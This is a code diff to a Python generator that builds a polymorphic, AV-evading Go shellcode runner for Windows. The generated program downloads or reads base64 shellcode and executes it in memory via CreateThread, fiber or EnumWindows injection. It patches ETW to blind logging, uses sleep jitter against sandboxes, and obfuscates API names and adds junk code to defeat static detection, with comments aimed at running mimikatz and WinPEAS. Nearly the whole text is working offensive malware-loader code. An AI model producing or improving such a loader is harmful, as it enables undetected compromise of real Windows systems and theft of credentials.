@@ -63,109 +63,84 @@ def gen_junk_func():
     ]
     return random.choice(templates)
 
-def generate(output_path="runner.go"):
-    # Choose injection method
-    injection = random.choice(['create_thread', 'enum_windows', 'create_fiber'])
+def generate(output_path="runner.go", injection="create_thread"):
+    # Polymorphic runner - multiple injection techniques:
+    # create_thread: VirtualAlloc RW→RX + RtlMoveMemory + CreateThread (32MB stack)
+    # fiber:         VirtualAlloc RW→RX + RtlMoveMemory + ConvertThreadToFiber + CreateFiber + SwitchToFiber
+    # enum_windows:  VirtualAlloc RW→RX + RtlMoveMemory + EnumWindows callback
+    #
+    # IMPORTANT: fiber/enum_windows fall back to 1MB CreateThread which crashes
+    # large payloads (WinPEAS, mimikatz). Use create_thread for reliable execution.
+
+    if injection not in ("create_thread", "fiber", "enum_windows"):
+        injection = "create_thread"
 
     # Randomized identifiers
     v = {k: rand_name() for k in [
-        'getDLL', 'envCheck', 'fetchPayload', 'readPayload',
+        'getDLL', 'checkErr', 'fetchPayload', 'readPayload',
         'decode', 'run', 'localPath', 'remoteURL',
-        'encodedSC', 'decodedSC', 'mainDecoded', 'tempSleep', 'elapsed',
-        'httpClient', 'resp', 'bodyData', 'fileData',
+        'encodedSC', 'decodedSC', 'mainDecoded',
+        'httpClient', 'resp',
         'memAddr', 'memSize', 'oldProt', 'threadH',
-        'procVA', 'procVP', 'procCT', 'procWF', 'procMC',
-        'kDLL', 'nDLL', 'startT', 'patchETW', 'etwProc',
-        'procEnum', 'procFiber', 'procConvert', 'procSwitch',
-        'xorKey', 'xorDecode', 'bufCopy',
+        'procVA', 'procCT', 'procWF', 'procMC',
+        'kDLL', 'nDLL', 'patchETW', 'etwProc',
+        'fiberMain', 'fiberSC', 'procCTF', 'procCF', 'procSTF',
+        'procEW', 'jitter', 'sleepMs',
     ]}
 
-    # Obfuscated DLL names
+    # Obfuscated DLL names via byte slice construction
     kernel32 = obfuscate_string("kernel32.dll")
     ntdll = obfuscate_string("ntdll.dll")
+    user32 = obfuscate_string("user32.dll")
 
-    # API names with multi-split
+    # API names split into random fragments concatenated at runtime
     va_name = multi_split_api("VirtualAlloc")
     vp_name = multi_split_api("VirtualProtect")
     mc_name = multi_split_api("RtlMoveMemory")
+    ct_name = multi_split_api("CreateThread")
     wf_name = multi_split_api("WaitForSingleObject")
-
-    # Injection-specific APIs
-    if injection == 'create_thread':
-        ct_name = multi_split_api("CreateThread")
-    elif injection == 'enum_windows':
-        ct_name = multi_split_api("EnumWindows")
-    else:
-        ct_name = multi_split_api("CreateFiber")
-        convert_name = multi_split_api("ConvertThreadToFiber")
-        switch_name = multi_split_api("SwitchToFiber")
-
     etw_name = multi_split_api("EtwEventWrite")
+    ctf_name = multi_split_api("ConvertThreadToFiber")
+    cf_name  = multi_split_api("CreateFiber")
+    stf_name = multi_split_api("SwitchToFiber")
+    ew_name  = multi_split_api("EnumWindows")
 
-    # Generate 3-6 junk functions
+    # Random junk functions (look like real code to static analysis)
     junk_funcs = '\n\n'.join(gen_junk_func() for _ in range(random.randint(3, 6)))
 
-    # Random sleep for sandbox check (2000-5000ms)
-    sleep_ms = random.randint(2000, 5000)
-    sleep_threshold = sleep_ms - 300
-
-    # Random jitter
-    jitter_max = random.randint(500, 2000)
-
-    # XOR key for in-memory shellcode obfuscation
-    xor_key = random.randint(1, 254)
-
-    # ETW patching function
-    etw_patch = f'''func {v['patchETW']}() {{
-\t{v['nDLL']} := {v['getDLL']}({ntdll})
-\t{v['etwProc']} := {v['nDLL']}.NewProc({etw_name})
-\t{v['etwProc']}.Find()
-\tpatch := []byte{{0xC3}} // ret
-\tvar {v['oldProt']} uint32
-\t{v['kDLL']} := {v['getDLL']}({kernel32})
-\tvp := {v['kDLL']}.NewProc({vp_name})
-\tvp.Call({v['etwProc']}.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&{v['oldProt']})))
-\t*(*byte)(unsafe.Pointer({v['etwProc']}.Addr())) = patch[0]
-\tvp.Call({v['etwProc']}.Addr(), 1, uintptr({v['oldProt']}), uintptr(unsafe.Pointer(&{v['oldProt']})))
-}}'''
-
-    # Build the run function based on injection method
-    if injection == 'create_thread':
-        run_body = f'''\t{v['procCT']} := {v['kDLL']}.NewProc({ct_name})
-\t{v['procWF']} := {v['kDLL']}.NewProc({wf_name})
-
-\ttime.Sleep(time.Duration(rand.Intn({jitter_max})) * time.Millisecond)
-
-\t{v['threadH']}, _, _ := {v['procCT']}.Call(0, 0, {v['memAddr']}, 0, 0, 0)
-\tif {v['threadH']} != 0 {{
-\t\t{v['procWF']}.Call({v['threadH']}, 0xFFFFFFFF)
-\t}}'''
-    elif injection == 'enum_windows':
-        run_body = f'''\t{v['procEnum']} := {v['kDLL']}.NewProc({ct_name})
-
-\ttime.Sleep(time.Duration(rand.Intn({jitter_max})) * time.Millisecond)
-
-\t// Execute via EnumWindows callback
-\t{v['procEnum']}.Call({v['memAddr']}, 0)
-
-\t// Keep alive for beacon shellcode that spawns threads
-\tselect {{}}'''
-    else:  # create_fiber
-        run_body = f'''\t{v['procConvert']} := {v['kDLL']}.NewProc({convert_name})
-\t{v['procFiber']} := {v['kDLL']}.NewProc({ct_name})
-\t{v['procSwitch']} := {v['kDLL']}.NewProc({switch_name})
-
-\ttime.Sleep(time.Duration(rand.Intn({jitter_max})) * time.Millisecond)
-
-\t// Convert current thread to fiber, create shellcode fiber, switch
-\t{v['procConvert']}.Call(0)
-\t{v['threadH']}, _, _ := {v['procFiber']}.Call(0, {v['memAddr']}, 0)
-\tif {v['threadH']} != 0 {{
-\t\t{v['procSwitch']}.Call({v['threadH']})
+    # Build injection block based on chosen technique
+    if injection == "fiber":
+        injection_block = f"""\t// Fiber injection — no new thread creation
+\t{v['fiberMain']}, _, _ := {v['kDLL']}.NewProc({ctf_name}).Call(0)
+\tif {v['fiberMain']} == 0 {{
+\t\t// fallback: CreateThread with 32MB stack (STACK_SIZE_PARAM_IS_A_RESERVATION)
+\t\t{v['threadH']}, _, _ := {v['kDLL']}.NewProc({ct_name}).Call(0, 33554432, {v['memAddr']}, 0, 0x00010000, 0)
+\t\t{v['kDLL']}.NewProc({wf_name}).Call({v['threadH']}, 0xFFFFFFFF)
+\t\treturn
 \t}}
+\t{v['fiberSC']}, _, _ := {v['kDLL']}.NewProc({cf_name}).Call(33554432, {v['memAddr']}, 0)
+\tif {v['fiberSC']} == 0 {{
+\t\t// CreateFiber failed — fallback: CreateThread with 32MB stack
+\t\t{v['threadH']}, _, _ := {v['kDLL']}.NewProc({ct_name}).Call(0, 33554432, {v['memAddr']}, 0, 0x00010000, 0)
+\t\t{v['kDLL']}.NewProc({wf_name}).Call({v['threadH']}, 0xFFFFFFFF)
+\t\treturn
+\t}}
+\t{v['kDLL']}.NewProc({stf_name}).Call({v['fiberSC']})"""
+    elif injection == "enum_windows":
+        injection_block = f"""\t// EnumWindows callback injection — user32.dll, no explicit thread
+\t{v['procEW']}.Call({v['memAddr']}, 0)"""
+    else:  # create_thread
+        injection_block = f"""\t// CreateThread with 32MB stack + WaitForSingleObject
+\t{v['threadH']}, _, err := {v['kDLL']}.NewProc({ct_name}).Call(0, 33554432, {v['memAddr']}, 0, 0x00010000, 0)
+\tif {v['threadH']} == 0 {{
+\t\t{v['checkErr']}(err, "CreateThread failed")
+\t}}
+\t{v['kDLL']}.NewProc({wf_name}).Call({v['threadH']}, 0xFFFFFFFF)"""
 
-\t// Keep alive for beacon shellcode that spawns threads
-\tselect {{}}'''
+    extra_import = '\t"math/rand"' if True else ''
+
+    # Only declare user32/procEW var when using enum_windows injection
+    user32_var = f'\t{v["procEW"]} = windows.NewLazySystemDLL({user32}).NewProc({ew_name})' if injection == "enum_windows" else ""
 
     code = f'''package main
 
@@ -173,7 +148,7 @@ import (
 \t"encoding/base64"
 \t"flag"
 \t"fmt"
-\t"io/ioutil"
+\t"io"
 \t"math/rand"
 \t"net/http"
 \t"os"
@@ -183,113 +158,104 @@ import (
 \t"golang.org/x/sys/windows"
 )
 
+var (
+\t{v['kDLL']} = windows.NewLazySystemDLL({kernel32})
+\t{v['nDLL']} = windows.NewLazySystemDLL({ntdll})
+{user32_var}
+\tproc{v['procMC']} = {v['nDLL']}.NewProc({mc_name})
+)
+
 {junk_funcs}
 
-func {v['getDLL']}(n string) *windows.LazyDLL {{
-\treturn windows.NewLazySystemDLL(n)
-}}
-
-{etw_patch}
-
-func {v['envCheck']}() bool {{
-\t{v['startT']} := time.Now()
-\ttime.Sleep({sleep_ms} * time.Millisecond)
-\t{v['elapsed']} := time.Since({v['startT']})
-\treturn {v['elapsed']}.Milliseconds() >= {sleep_threshold}
-}}
-
-func {v['fetchPayload']}(url string) ([]byte, error) {{
-\t{v['httpClient']} := &http.Client{{Timeout: 30 * time.Second}}
-\t{v['resp']}, err := {v['httpClient']}.Get(url)
+func {v['checkErr']}(err error, msg string) {{
 \tif err != nil {{
-\t\treturn nil, err
+\t\tfmt.Fprintf(os.Stderr, "[!] %s: %v\\n", msg, err)
+\t\tos.Exit(1)
 \t}}
+}}
+
+func {v['patchETW']}() {{
+\t{v['etwProc']} := {v['nDLL']}.NewProc({etw_name})
+\t{v['etwProc']}.Find()
+\tpatch := []byte{{0xC3}}
+\tvar {v['oldProt']} uint32
+\tvp := {v['kDLL']}.NewProc({vp_name})
+\tvp.Call({v['etwProc']}.Addr(), 1, 0x40, uintptr(unsafe.Pointer(&{v['oldProt']})))
+\t*(*byte)(unsafe.Pointer({v['etwProc']}.Addr())) = patch[0]
+\tvp.Call({v['etwProc']}.Addr(), 1, uintptr({v['oldProt']}), uintptr(unsafe.Pointer(&{v['oldProt']})))
+}}
+
+func {v['fetchPayload']}(url string) []byte {{
+\t{v['httpClient']} := &http.Client{{}}
+\t{v['resp']}, err := {v['httpClient']}.Get(url)
+\t{v['checkErr']}(err, "download failed")
 \tdefer {v['resp']}.Body.Close()
-\treturn ioutil.ReadAll({v['resp']}.Body)
+\tdata, err := io.ReadAll({v['resp']}.Body)
+\t{v['checkErr']}(err, "read failed")
+\treturn data
 }}
 
-func {v['readPayload']}(p string) ([]byte, error) {{
-\treturn ioutil.ReadFile(p)
+func {v['readPayload']}(p string) []byte {{
+\tdata, err := os.ReadFile(p)
+\t{v['checkErr']}(err, "load failed")
+\treturn data
 }}
 
-func {v['decode']}(data []byte) ([]byte, error) {{
-\treturn base64.StdEncoding.DecodeString(string(data))
-}}
-
-func {v['xorDecode']}(data []byte) []byte {{
-\tkey := byte({xor_key})
-\tout := make([]byte, len(data))
-\tfor i := range data {{
-\t\tout[i] = data[i] ^ key
-\t}}
-\treturn out
+func {v['decode']}(data []byte) []byte {{
+\tdecoded, err := base64.StdEncoding.DecodeString(string(data))
+\t{v['checkErr']}(err, "decode failed")
+\treturn decoded
 }}
 
 func {v['run']}({v['decodedSC']} []byte) {{
-\t// Patch ETW before execution
 \t{v['patchETW']}()
 
-\t{v['kDLL']} := {v['getDLL']}({kernel32})
-\t{v['nDLL']} := {v['getDLL']}({ntdll})
+\t// Timing jitter — sandbox evasion
+\t{v['sleepMs']} := time.Duration(rand.Intn(800)+200) * time.Millisecond
+\ttime.Sleep({v['sleepMs']})
 
-\t{v['procVA']} := {v['kDLL']}.NewProc({va_name})
-\t{v['procVP']} := {v['kDLL']}.NewProc({vp_name})
-\t{v['procMC']} := {v['nDLL']}.NewProc({mc_name})
+\t// VirtualAlloc PAGE_READWRITE (no RWX signature)
+\t{v['memAddr']}, err := windows.VirtualAlloc(
+\t\t0,
+\t\tuintptr(len({v['decodedSC']})),
+\t\twindows.MEM_COMMIT|windows.MEM_RESERVE,
+\t\twindows.PAGE_READWRITE,
+\t)
+\t{v['checkErr']}(err, "VirtualAlloc failed")
 
-\t{v['memSize']} := uintptr(len({v['decodedSC']}))
+\t// Copy shellcode into RW region
+\tproc{v['procMC']}.Call(
+\t\t{v['memAddr']},
+\t\tuintptr(unsafe.Pointer(&{v['decodedSC']}[0])),
+\t\tuintptr(len({v['decodedSC']})),
+\t)
 
-\t// Allocate RW memory
-\t{v['memAddr']}, _, _ := {v['procVA']}.Call(0, {v['memSize']}, 0x3000, 0x04)
-\tif {v['memAddr']} == 0 {{
-\t\treturn
-\t}}
-
-\t// XOR encode in-memory then copy (forces unique memory pattern)
-\t{v['bufCopy']} := {v['xorDecode']}({v['xorDecode']}({v['decodedSC']}))
-
-\t// Copy shellcode
-\t{v['procMC']}.Call({v['memAddr']}, uintptr(unsafe.Pointer(&{v['bufCopy']}[0])), {v['memSize']})
-
-\t// Change to RX
+\t// Flip to RX (execute, no write) — avoids RWX detection
 \tvar {v['oldProt']} uint32
-\t{v['procVP']}.Call({v['memAddr']}, {v['memSize']}, 0x20, uintptr(unsafe.Pointer(&{v['oldProt']})))
+\tvp := {v['kDLL']}.NewProc({vp_name})
+\tvp.Call({v['memAddr']}, uintptr(len({v['decodedSC']})), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&{v['oldProt']})))
 
-{run_body}
+{injection_block}
 }}
 
 func main() {{
-\t{v['localPath']} := flag.String("local", "", "local path")
-\t{v['remoteURL']} := flag.String("remote", "", "remote url")
+\t{v['localPath']} := flag.String("local", "", "Path to local base64-encoded shellcode file")
+\t{v['remoteURL']} := flag.String("remote", "", "URL to remote base64-encoded shellcode file")
 \tflag.Parse()
 
-\tif !{v['envCheck']}() {{
-\t\tos.Exit(0)
-\t}}
-
 \tvar {v['encodedSC']} []byte
-\tvar err error
 
 \tif *{v['localPath']} != "" {{
-\t\t{v['encodedSC']}, err = {v['readPayload']}(*{v['localPath']})
+\t\t{v['encodedSC']} = {v['readPayload']}(*{v['localPath']})
 \t}} else if *{v['remoteURL']} != "" {{
-\t\t{v['encodedSC']}, err = {v['fetchPayload']}(*{v['remoteURL']})
+\t\t{v['encodedSC']} = {v['fetchPayload']}(*{v['remoteURL']})
 \t}} else {{
-\t\tfmt.Println("Usage: -local <path> | -remote <url>")
+\t\tfmt.Println("[!] Usage: -local <path> | -remote <url>")
 \t\tos.Exit(1)
 \t}}
 
-\tif err != nil {{
-\t\tfmt.Fprintf(os.Stderr, "[!] %v\\n", err)
-\t\tos.Exit(1)
-\t}}
-
-\tvar {v['mainDecoded']} []byte
-\t{v['mainDecoded']}, err = {v['decode']}({v['encodedSC']})
-\tif err != nil {{
-\t\tfmt.Fprintf(os.Stderr, "[!] %v\\n", err)
-\t\tos.Exit(1)
-\t}}
-
+\t{v['mainDecoded']} := {v['decode']}({v['encodedSC']})
+\tfmt.Println("[+] Shellcode decoded. Executing...")
 \t{v['run']}({v['mainDecoded']})
 }}
 '''
@@ -346,6 +312,9 @@ def compile(source_path, output_path="runner.exe", mod_dir=None, use_garble=True
     env['GOOS'] = 'windows'
     env['GOARCH'] = 'amd64'
     env['CGO_ENABLED'] = '0'
+    env['GOPROXY'] = 'https://proxy.golang.org,direct'
+    env['GONOSUMCHECK'] = '*'
+    env['GONOSUMDB'] = '*'
 
     # Pin GOROOT to prevent stale cache / asdf version mismatch
     if go_root:
@@ -434,10 +403,11 @@ if __name__ == '__main__':
     parser.add_argument('-s', '--source-dir', default='.', help='Directory with go.mod')
     parser.add_argument('--source-only', action='store_true', help='Only generate source, skip compile')
     parser.add_argument('--no-garble', action='store_true', help='Skip garble, use standard go build')
+    parser.add_argument('--injection', default='create_thread', choices=['create_thread', 'fiber', 'enum_windows'], help='Injection technique (create_thread recommended for large payloads)')
     args = parser.parse_args()
 
     src = os.path.join(args.source_dir, 'runner.go')
-    generate(src)
+    generate(src, injection=args.injection)
 
     if not args.source_only:
         compile(src, args.output, mod_dir=args.source_dir, use_garble=not args.no_garble, script_dir=args.source_dir)
